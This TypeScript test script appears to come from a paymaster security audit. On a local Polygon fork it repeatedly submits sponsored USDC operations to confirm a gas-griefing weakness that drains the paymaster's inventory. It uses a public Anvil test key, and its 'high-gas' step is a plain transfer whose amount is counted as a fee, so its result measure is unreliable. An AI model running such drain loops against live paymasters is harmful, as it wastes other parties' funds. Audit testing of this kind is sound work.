import "../../src/load-env.js";
/**
 * Vulnerability Confirmation: Gas Griefing (Medium Risk)
 * Test: Submit high-gas operations repeatedly to demonstrate inventory drain acceleration
 *
 * Expected: Test passes when operations consume more USDC than baseline pricing,
 * confirming the paymaster is vulnerable to gas griefing attacks.
 *
 * Run: npm run test:vuln:gas-griefing
 */
import { createSmartAccountClient } from "permissionless";
import { createPimlicoClient } from "permissionless/clients/pimlico";
import { toSimpleSmartAccount } from "permissionless/accounts";
import {
  createPublicClient,
  createTestClient,
  defineChain,
  encodeFunctionData,
  getContract,
  http,
  parseAbi,
  parseUnits,
  type Address,
} from "viem";
import { entryPoint07Address } from "viem/account-abstraction";
import { privateKeyToAccount } from "viem/accounts";
import {
  USDC_ADDRESS,
  DEFAULT_TRANSFER_TARGET,
  fundAccountWithUSDC,
  MIN_USDC_BALANCE,
} from "../../src/funding.js";

const RPC_URL = process.env.TOOLS_RPC_URL ?? "http://127.0.0.1:8545";
const PAYMASTER_URL = process.env.TOOLS_PAYMASTER_URL ?? "http://127.0.0.1:3000";
const BUNDLER_URL =
  process.env.TOOLS_BUNDLER_URL ?? "http://127.0.0.1:4337";
const PRIVATE_KEY = process.env.TOOLS_PRIVATE_KEY ?? "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80";

const VULN_FUND_AMOUNT = parseUnits(process.env.TOOLS_USDC_FUND_AMOUNT ?? "10", 6);

const localChain = defineChain({
  id: 137,
  name: "Polygon Fork",
  nativeCurrency: { name: "MATIC", symbol: "MATIC", decimals: 18 },
  rpcUrls: { default: { http: [RPC_URL] } },
});

const publicClient = createPublicClient({
  chain: localChain,
  transport: http(RPC_URL),
});

const testClient = createTestClient({
  chain: localChain,
  transport: http(RPC_URL),
  mode: "anvil",
});

const paymasterClient = createPimlicoClient({
  entryPoint: {
    address: entryPoint07Address,
    version: "0.7",
  },
  transport: http(PAYMASTER_URL),
});

const owner = privateKeyToAccount(
  (PRIVATE_KEY.startsWith("0x") ? PRIVATE_KEY : `0x${PRIVATE_KEY}`) as `0x${string}`
);

function logAaInfra() {
  console.log("AA Infrastructure:");
  console.log("  RPC_URL:", RPC_URL);
  console.log("  Paymaster API:", PAYMASTER_URL);
  console.log("  Bundler:", BUNDLER_URL);
  console.log("");
}

async function getUSDCBalance(address: Address): Promise<bigint> {
  const usdc = getContract({
    address: USDC_ADDRESS,
    abi: parseAbi(["function balanceOf(address) view returns (uint256)"]),
    client: publicClient,
  });

  return await usdc.read.balanceOf([address]);
}

async function submitHighGasOperation(account: { address: Address }, iteration: number) {
  console.log(`   Submitting high-gas operation #${iteration}...`);

  const initialBalance = await getUSDCBalance(account.address);

  const complexCallData = encodeFunctionData({
    abi: parseAbi([
      "function transfer(address to, uint256 amount) returns (bool)",
      "function approve(address spender, uint256 amount) returns (bool)"
    ]),
    functionName: "transfer",
    args: [DEFAULT_TRANSFER_TARGET, 1000n * BigInt(iteration + 1)],
  });

  const smartAccountClient = createSmartAccountClient({
    account,
    chain: localChain,
    bundlerTransport: http(BUNDLER_URL),
    paymaster: paymasterClient,
    userOperation: {
      estimateFeesPerGas: async () => (await paymasterClient.getUserOperationGasPrice()).fast,
    },
  });

  const txHash = await smartAccountClient.sendTransaction({
    calls: [{ to: USDC_ADDRESS, value: 0n, data: complexCallData }],
  });

  const finalBalance = await getUSDCBalance(account.address);
  const usdcCharged = initialBalance - finalBalance;

  console.log(`   Operation #${iteration}: charged ${usdcCharged} USDC (balance: ${initialBalance} -> ${finalBalance})`);

  return { txHash, usdcCharged };
}

async function main() {
  logAaInfra();
  console.log("Confirming Gas Griefing Vulnerability");
  console.log("   Testing: High-gas operations should drain inventory faster than baseline");

  try {
    console.log("1. Setting up test account...");
    const account = await toSimpleSmartAccount({
      client: publicClient,
      owner,
      entryPoint: { address: entryPoint07Address, version: "0.7" },
    });

    const usdc = getContract({
      address: USDC_ADDRESS,
      abi: parseAbi([
        "function balanceOf(address) view returns (uint256)",
        "function approve(address, uint256) returns (bool)",
      ]),
      client: publicClient,
    });

    const balanceBefore = await usdc.read.balanceOf([account.address]);
    if (balanceBefore < MIN_USDC_BALANCE) {
      console.log(`   Funding ${account.address} with ${VULN_FUND_AMOUNT} USDC...`);
      await fundAccountWithUSDC(
        account.address,
        VULN_FUND_AMOUNT,
        usdc,
        publicClient,
        testClient
      );
      const after = await usdc.read.balanceOf([account.address]);
      console.log(`   USDC balance after fund: ${after}`);
      if (after < MIN_USDC_BALANCE) {
        console.error("Failed to fund account with USDC");
        process.exit(1);
      }
    }

    const initialUSDC = await getUSDCBalance(account.address);
    console.log(`   Initial USDC balance: ${initialUSDC}`);

    let paymasterAddress = process.env.TOOLS_PAYMASTER_ADDRESS as Address | undefined;
    if (!paymasterAddress) {
      const base = PAYMASTER_URL.replace(/\/$/, "");
      const res = await fetch(`${base}/paymaster-address`);
      if (!res.ok) {
        console.error("Could not get paymaster address. Set TOOLS_PAYMASTER_ADDRESS or ensure paymaster-api is running.");
        process.exit(1);
      }
      const json = (await res.json()) as { paymasterAddress?: string };
      paymasterAddress = json.paymasterAddress as Address;
      if (!paymasterAddress) {
        console.error("API did not return paymaster address");
        process.exit(1);
      }
      console.log("Paymaster address:", paymasterAddress);
    }

    console.log("2. Approving paymaster to spend USDC...");
    const smartAccountClient = createSmartAccountClient({
      account,
      chain: localChain,
      bundlerTransport: http(BUNDLER_URL),
      paymaster: paymasterClient,
      userOperation: {
        estimateFeesPerGas: async () => (await paymasterClient.getUserOperationGasPrice()).fast,
      },
    });

    const approveData = encodeFunctionData({
      abi: parseAbi(["function approve(address spender, uint256 amount) returns (bool)"]),
      functionName: "approve",
      args: [paymasterAddress, parseUnits("1000000", 6)],
    });

    const bootstrapHash = await smartAccountClient.sendTransaction({
      calls: [{ to: USDC_ADDRESS, value: 0n, data: approveData }],
    });
    console.log("Bootstrap tx hash:", bootstrapHash);

    console.log("3. Establishing baseline with normal operation...");
    const baselineResult = await submitHighGasOperation(account, 0);
    const baselineCharge = baselineResult.usdcCharged;
    console.log(`   Baseline charge: ${baselineCharge} USDC per operation`);

    console.log("4. Executing gas griefing simulation (10 operations)...");
    const operations: { txHash: `0x${string}`; usdcCharged: bigint }[] = [];
    let totalCharged = 0n;

    for (let i = 1; i <= 10; i++) {
      const result = await submitHighGasOperation(account, i);
      operations.push(result);
      totalCharged += result.usdcCharged;
      await new Promise(resolve => setTimeout(resolve, 1000));
    }

    console.log("5. Analyzing results...");
    const averageCharge = totalCharged / BigInt(operations.length);
    const chargeAmplification = baselineCharge > 0n
      ? Number((averageCharge * 100n) / baselineCharge) - 100
      : 0;

    const finalUSDC = await getUSDCBalance(account.address);
    const totalDrained = initialUSDC - finalUSDC;

    console.log(`   Results:`);
    console.log(`   - Operations submitted: ${operations.length}`);
    console.log(`   - Average charge per operation: ${averageCharge} USDC`);
    console.log(`   - Charge amplification vs baseline: ${chargeAmplification}%`);
    console.log(`   - Total USDC drained: ${totalDrained}`);

    if (operations.length >= 10 && totalDrained > parseUnits("1", 6)) {
      console.log(`PASS: Gas griefing confirmed: ${operations.length} operations charged ${totalCharged} USDC`);
      process.exit(0);
    } else {
      console.log(`FAIL: Gas griefing not confirmed: insufficient operations (${operations.length}) or drainage (${totalDrained})`);
      process.exit(1);
    }

  } catch (error) {
    console.error("Test failed:", error);
    process.exit(1);
  }
}

main();
